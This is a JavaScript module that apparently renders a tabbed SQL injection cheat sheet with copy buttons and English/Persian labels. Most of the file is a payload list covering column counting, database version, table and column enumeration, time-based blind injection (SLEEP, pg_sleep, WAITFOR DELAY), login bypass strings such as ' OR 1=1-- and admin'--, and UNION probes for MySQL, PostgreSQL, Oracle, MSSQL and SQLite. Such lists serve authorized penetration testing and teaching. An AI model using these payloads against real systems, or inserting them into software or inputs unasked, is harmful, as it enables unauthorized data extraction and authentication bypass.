const categories = {
  'Number of Columns': [
    { db: '*', payload: "ORDER BY 1--" },
    { db: '*', payload: "ORDER BY 2--" },
    { db: '*', payload: "ORDER BY 3--" },
    { db: '*', payload: "ORDER BY 4--" },
    { db: '*', payload: "ORDER BY 5--" },
    { db: '*', payload: "ORDER BY 10--" },
    { db: '*', payload: "ORDER BY 100--" },
    { db: '*', payload: "UNION SELECT 1--" },
    { db: '*', payload: "UNION SELECT 1,2--" },
    { db: '*', payload: "UNION SELECT 1,2,3--" },
    { db: '*', payload: "UNION SELECT 1,2,3,4--" },
    { db: '*', payload: "UNION SELECT 1,2,3,4,5--" },
    { db: '*', payload: "UNION SELECT NULL--" },
    { db: '*', payload: "UNION SELECT NULL,NULL--" },
    { db: '*', payload: "UNION SELECT NULL,NULL,NULL--" },
    { db: '*', payload: "UNION SELECT NULL,NULL,NULL,NULL--" },
    { db: '*', payload: "UNION SELECT NULL,NULL,NULL,NULL,NULL--" },
  ],
  'DB Version Enumeration': [
    { db: 'MySQL/MariaDB', payload: "SELECT @@version" },
    { db: 'MySQL/MariaDB', payload: "SELECT VERSION()" },
    { db: 'MySQL/MariaDB', payload: "UNION SELECT @@version,2,3--" },
    { db: 'PostgreSQL', payload: "SELECT version()" },
    { db: 'PostgreSQL', payload: "UNION SELECT version(),2,3--" },
    { db: 'Oracle', payload: "SELECT banner FROM v$version" },
    { db: 'Oracle', payload: "SELECT banner FROM v$version WHERE rownum=1" },
    { db: 'Oracle', payload: "UNION SELECT banner,NULL FROM v$version--" },
    { db: 'MSSQL', payload: "SELECT @@version" },
    { db: 'MSSQL', payload: "UNION SELECT @@version,2,3--" },
    { db: 'SQLite', payload: "SELECT sqlite_version()" },
  ],
  'Table Enumeration': [
    { db: 'MySQL', payload: "SELECT table_name FROM information_schema.tables" },
    { db: 'MySQL', payload: "UNION SELECT table_name,2,3 FROM information_schema.tables--" },
    { db: 'MySQL', payload: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()" },
    { db: 'MySQL', payload: "UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--" },
    { db: 'PostgreSQL', payload: "SELECT table_name FROM information_schema.tables" },
    { db: 'PostgreSQL', payload: "UNION SELECT table_name,2,3 FROM information_schema.tables--" },
    { db: 'Oracle', payload: "SELECT table_name FROM all_tables" },
    { db: 'Oracle', payload: "SELECT owner,table_name FROM all_tables" },
    { db: 'MSSQL', payload: "SELECT name FROM sysobjects WHERE xtype='U'" },
    { db: 'MSSQL', payload: "UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--" },
    { db: 'SQLite', payload: "SELECT name FROM sqlite_master WHERE type='table'" },
    { db: 'SQLite', payload: "UNION SELECT name FROM sqlite_master WHERE type='table'--" },
  ],
  'Column Enumeration': [
    { db: 'MySQL', payload: "SELECT column_name FROM information_schema.columns WHERE table_name='users'" },
    { db: 'MySQL', payload: "UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--" },
    { db: 'PostgreSQL', payload: "SELECT column_name FROM information_schema.columns WHERE table_name='users'" },
    { db: 'Oracle', payload: "SELECT column_name FROM all_tab_columns WHERE table_name='USERS'" },
    { db: 'MSSQL', payload: "SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')" },
    { db: 'SQLite', payload: "SELECT sql FROM sqlite_master WHERE name='users'" },
  ],
  'Time-Based': [
    { db: 'MySQL', payload: "IF((SELECT 1)=1,SLEEP(5),0)" },
    { db: 'MySQL', payload: "' OR IF((SELECT 1)=1,SLEEP(5),0)--" },
    { db: 'MySQL', payload: "1' AND SLEEP(5)--" },
    { db: 'MySQL', payload: "1' AND BENCHMARK(5000000,MD5('x'))--" },
    { db: 'PostgreSQL', payload: "1'; SELECT pg_sleep(5)--" },
    { db: 'PostgreSQL', payload: "1' AND (SELECT pg_sleep(5))--" },
    { db: 'Oracle', payload: "1' AND dbms_pipe.receive_message('x',5)='x--" },
    { db: 'Oracle', payload: "1' AND (SELECT count(*) FROM all_objects)='1--" },
    { db: 'MSSQL', payload: "1'; WAITFOR DELAY '0:0:5'--" },
    { db: 'MSSQL', payload: "1' AND WAITFOR DELAY '0:0:5'--" },
    { db: 'SQLite', payload: "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--" },
  ],
  'Auth Bypass': [
    { db: '*', payload: "' OR 1=1--" },
    { db: '*', payload: "' OR '1'='1" },
    { db: '*', payload: "' OR '1'='1'--" },
    { db: '*', payload: "' OR 1=1#" },
    { db: '*', payload: "' OR 1=1/*" },
    { db: '*', payload: "admin' OR 1=1--" },
    { db: '*', payload: "admin'--" },
    { db: '*', payload: "admin' #" },
    { db: '*', payload: "admin'/*" },
    { db: '*', payload: "' UNION SELECT 1,'admin','password'--" },
    { db: '*', payload: "1' OR '1'='1' LIMIT 1--" },
    { db: '*', payload: "' OR 1=1 LIMIT 1--" },
  ],
  'Order/Union': [
    { db: '*', payload: "' ORDER BY 1--" },
    { db: '*', payload: "' ORDER BY 2--" },
    { db: '*', payload: "' ORDER BY 3--" },
    { db: '*', payload: "' UNION SELECT null--" },
    { db: '*', payload: "' UNION SELECT null,null--" },
    { db: '*', payload: "' UNION SELECT null,null,null--" },
    { db: '*', payload: "') UNION SELECT 1,2,3--" },
    { db: '*', payload: ")) UNION SELECT 1,2,3--" },
    { db: '*', payload: "1' ORDER BY 1--" },
    { db: '*', payload: "1' ORDER BY 2--" },
    { db: '*', payload: "1' UNION SELECT 1,2,3--" },
  ],
};

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function dbClass(db) {
  if (db === '*') return '';
  return db.toLowerCase().replace(/[^a-z0-9]/g, '-');
}

export default function render(lang) {
  const isFa = lang === 'fa';
  const catNames = Object.keys(categories);
  return `
<div class="section-title">${isFa ? 'پیلودهای SQL Injection' : 'SQL Injection Payloads'}</div>
<div class="tabs" id="sqli-tabs">
  ${catNames.map((c, i) => `<button class="tab${i === 0 ? ' active' : ''}" data-tab="sqli-${i}">${c}</button>`).join('')}
</div>
${catNames.map((c, i) => `
<div class="tab-pane${i === 0 ? ' active' : ''}" id="sqli-${i}">
  ${categories[c].map(p => `
  <div class="panel" style="padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px">
    ${p.db !== '*' ? `<span class="chip ${dbClass(p.db)}">${p.db}</span>` : ''}
    <pre style="flex:1;margin:0;overflow:auto"><code>${escapeHtml(p.payload)}</code></pre>
    <button class="secondary-btn" data-copy="${escapeHtml(p.payload)}" style="flex-shrink:0">${isFa ? 'کپی' : 'Copy'}</button>
  </div>`).join('')}
</div>`).join('')}`;
}

export function init(lang) {
  const container = document.getElementById('content');
  container.addEventListener('click', (e) => {
    const btn = e.target.closest('.secondary-btn');
    if (btn && btn.hasAttribute('data-copy')) {
      navigator.clipboard.writeText(btn.getAttribute('data-copy'));
    }
    const tab = e.target.closest('.tab');
    if (tab && tab.closest('#sqli-tabs')) {
      container.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      container.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      const pane = document.getElementById(tab.getAttribute('data-tab'));
      if (pane) pane.classList.add('active');
    }
  });
}
